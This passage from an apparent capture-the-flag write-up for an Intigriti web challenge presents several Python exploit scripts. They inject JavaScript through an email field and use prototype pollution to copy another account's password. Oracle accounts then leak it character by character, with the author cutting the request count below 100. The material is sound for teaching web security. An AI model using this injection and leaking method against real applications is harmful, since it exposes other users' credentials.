  data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
  char <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'account_oracle_'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> char

start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> SKIP_CREATE_ORACLE <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"create oracle account..."</span><span class="token punctuation">)</span>
  total <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span>
  current <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span>MAX_WORKERS<span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
      futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>create_oracle<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span> c <span class="token keyword">for</span> c <span class="token keyword">in</span> charset<span class="token punctuation">&#125;</span>
      <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
          current <span class="token operator">+=</span> <span class="token number">1</span>
          <span class="token keyword">if</span> current <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> current <span class="token operator">==</span> total<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Progress: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>current<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>total<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaking flag"</span><span class="token punctuation">)</span>
length <span class="token operator">=</span> <span class="token number">19</span>
ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">]</span> <span class="token operator">*</span> length
<span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
    futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>leak_char<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
        index <span class="token operator">=</span> futures<span class="token punctuation">[</span>future<span class="token punctuation">]</span>
        data <span class="token operator">=</span> future<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span>
        ans<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> data
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">&#125;</span></span><span class="token string">s, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>req_count<span class="token punctuation">&#125;</span></span><span class="token string"> requests"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>It takes 12s and 157 requests, we reduced 29 requests!</p>
<h2><span id="can-we-make-it-less-than-100-requests">Can we make it less than 100 requests?</span></h2><p>156 requests is not that far from 100, it’s promising to give it a try.</p>
<p>Our solution consist of two phases, setup and leaking.</p>
<p>For setup phase, we make 100 requests to cover all possible characters. Leaking one character takes 1 login request + 1 edit request + 1 search request, so it’s 3 * 19 &#x3D; 57 to leak the whole flag.</p>
<p>Apparently, we send too much requests in setup phase.</p>
<p>To make it less, we can use a new approach.</p>
<p>Instead of creating 100 oracles, we create only 10 oracles(0-9). For every character, we leak twice, first time we leak <code>ASCII % 10</code>, second time leak <code>ASCII / 10</code>.</p>
<p><code>~</code> is the last printable character, it has ASCII code 126, and the first printable character is <code>!</code>, ASCII code 33.</p>
<p>So, if we get the ASCII code of the flag and minus 27, it’s guarantee that it has at most two digits.</p>
<p>Assumed that the character we are leaking has ASCII code 68, it’s 41 after miuns 27.</p>
<p>The goal is to leak “4” for the first round and “1” for the second round.</p>
<p>By using this new approach, the request is now 10(setup) + 6 * 19(leaking) &#x3D; 124.</p>
<p>Moreover, we don’t need to create the account again for the second round, so it’s 10 + 5 * 19 &#x3D; 105 requests, very close to 100.</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> concurrent<span class="token punctuation">.</span>futures
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time

BASE_URL <span class="token operator">=</span> <span class="token string">'https://challenge-0123.intigriti.io'</span>
LOGIN_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/login.html'</span>
EDIT_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/editor.html'</span>
QUERY_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/api/friends?q='</span>

SKIP_CREATE_ORACLE <span class="token operator">=</span> <span class="token number">0</span>
MAX_WORKERS <span class="token operator">=</span> <span class="token number">15</span>
charset <span class="token operator">=</span> string<span class="token punctuation">.</span>digits
req_count <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">def</span> <span class="token function">create_oracle</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">global</span> req_count
  session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"account_oracle_"</span> <span class="token operator">+</span> c<span class="token punctuation">,</span>
    <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"account_oracle_"</span> <span class="token operator">+</span> c<span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  req_count<span class="token operator">+=</span><span class="token number">1</span>
  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_char</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token comment"># leak 10a + b + 27 = ascii</span>
  <span class="token keyword">global</span> req_count
  payload <span class="token operator">=</span> <span class="token string">'anything@anything.com" || this.username=="PinkDraconian" &amp;&amp; (() => &#123;this.__proto__.flag = this.password;&#125;)() || this.flag &amp;&amp; this.username == "account_oracle_" + (this.flag.charCodeAt('</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">') - 27) % 10 || "'</span>
  session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>

  name <span class="token operator">=</span> <span class="token string">"account_get_"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>

  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span> name<span class="token punctuation">,</span>
    <span class="token string">"password"</span><span class="token punctuation">:</span> name
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>EDIT_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"email"</span><span class="token punctuation">:</span> payload
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>QUERY_URL <span class="token operator">+</span> name<span class="token punctuation">)</span>
  req_count<span class="token operator">+=</span><span class="token number">3</span>

  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'#'</span>

  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'null'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Failed'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'#'</span>

  data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
  b <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'account_oracle_'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>

  <span class="token comment"># do it again to leak</span>
  payload <span class="token operator">=</span> <span class="token string">'anything@anything.com" || this.username=="PinkDraconian" &amp;&amp; (() => &#123;this.__proto__.flag = this.password;&#125;)() || this.flag &amp;&amp; this.username == "account_oracle_" + Math.floor((this.flag.charCodeAt('</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">') - 27) / 10) || "'</span>

  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>EDIT_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"email"</span><span class="token punctuation">:</span> payload
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>QUERY_URL <span class="token operator">+</span> name<span class="token punctuation">)</span>
  req_count<span class="token operator">+=</span><span class="token number">2</span>

  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'#'</span>

  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'null'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Failed'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'#'</span>

  data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
  a <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'account_oracle_'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
  a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
  b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>

  <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token operator">*</span>a <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token number">27</span><span class="token punctuation">)</span>

start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> SKIP_CREATE_ORACLE <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"create oracle account..."</span><span class="token punctuation">)</span>
  total <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span>
  current <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span>MAX_WORKERS<span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
      futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>create_oracle<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span> c <span class="token keyword">for</span> c <span class="token keyword">in</span> charset<span class="token punctuation">&#125;</span>
      <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
          current <span class="token operator">+=</span> <span class="token number">1</span>
          <span class="token keyword">if</span> current <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> current <span class="token operator">==</span> total<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Progress: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>current<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>total<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaking flag"</span><span class="token punctuation">)</span>
length <span class="token operator">=</span> <span class="token number">19</span>
ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">]</span> <span class="token operator">*</span> length
<span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
    futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>leak_char<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
        index <span class="token operator">=</span> futures<span class="token punctuation">[</span>future<span class="token punctuation">]</span>
        data <span class="token operator">=</span> future<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span>
        ans<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> data
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">&#125;</span></span><span class="token string">s, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>req_count<span class="token punctuation">&#125;</span></span><span class="token string"> requests"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>If you look at the code carefully, you will find that we can reuse the <code>account_oracle_</code> session instead of creating a new one, so it’s 105 - 10 &#x3D; 95 requests now, finally reach our goal!</p>
<p>I also refactored the JS part to make it more clear and readable. </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> concurrent<span class="token punctuation">.</span>futures
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time

BASE_URL <span class="token operator">=</span> <span class="token string">'https://challenge-0123.intigriti.io'</span>
LOGIN_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/login.html'</span>
EDIT_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/editor.html'</span>
QUERY_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/api/friends?q='</span>

SKIP_CREATE_ORACLE <span class="token operator">=</span> <span class="token number">0</span>
MAX_WORKERS <span class="token operator">=</span> <span class="token number">15</span>
charset <span class="token operator">=</span> string<span class="token punctuation">.</span>digits
req_count <span class="token operator">=</span> <span class="token number">0</span>
stored_session <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">create_oracle</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">global</span> req_count
  <span class="token keyword">global</span> stored_session
  session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"account_oracle_"</span> <span class="token operator">+</span> c<span class="token punctuation">,</span>
    <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"account_oracle_"</span> <span class="token operator">+</span> c<span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  stored_session<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token string">"session"</span><span class="token punctuation">:</span> session<span class="token punctuation">,</span>
    <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"account_oracle_"</span> <span class="token operator">+</span> c
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  req_count<span class="token operator">+=</span><span class="token number">1</span>
  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_char</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token comment"># leak 10a + b + 27 = ascii</span>
  <span class="token keyword">global</span> req_count
  <span class="token keyword">global</span> stored_session
  js_code <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
  if (this.username == "PinkDraconian")&#123;
    this.__proto__.flag = this.password;
  &#125; else if (this.flag) &#123;
    if (CONDITION) &#123;
      return this.username == "account_oracle_" + Math.floor((this.flag.charCodeAt(INDEX) - 27) / 10)
    &#125;

    return this.username == "account_oracle_" +  (this.flag.charCodeAt(INDEX) - 27) % 10
  &#125;
  """</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'INDEX'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

  payload <span class="token operator">=</span> <span class="token string">'anything@anything.com" || (() => &#123;JS&#125;)() || "'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'JS'</span><span class="token punctuation">,</span> js_code<span class="token punctuation">)</span>

  session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>

  <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>stored_session<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> stored_session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>
    session <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"session"</span><span class="token punctuation">]</span>
    name <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span>
  <span class="token keyword">else</span><span class="token punctuation">:</span>
    name <span class="token operator">=</span> <span class="token string">"account_get_"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>

    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
      <span class="token string">"username"</span><span class="token punctuation">:</span> name<span class="token punctuation">,</span>
      <span class="token string">"password"</span><span class="token punctuation">:</span> name
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    req_count <span class="token operator">+=</span> <span class="token number">1</span>

  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>EDIT_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"email"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"CONDITION"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>QUERY_URL <span class="token operator">+</span> name<span class="token punctuation">)</span>
  req_count<span class="token operator">+=</span><span class="token number">2</span>

  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'#'</span>

  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'null'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Failed'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'#'</span>

  data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
  b <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'account_oracle_'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>

  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>EDIT_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"email"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"CONDITION"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>QUERY_URL <span class="token operator">+</span> name<span class="token punctuation">)</span>
  req_count<span class="token operator">+=</span><span class="token number">2</span>

  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'#'</span>

  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'null'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Failed'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'#'</span>

  data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
  a <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'account_oracle_'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
  a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
  b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>

  <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token operator">*</span>a <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token number">27</span><span class="token punctuation">)</span>

start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"create oracle account..."</span><span class="token punctuation">)</span>
total <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span>
current <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span>MAX_WORKERS<span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
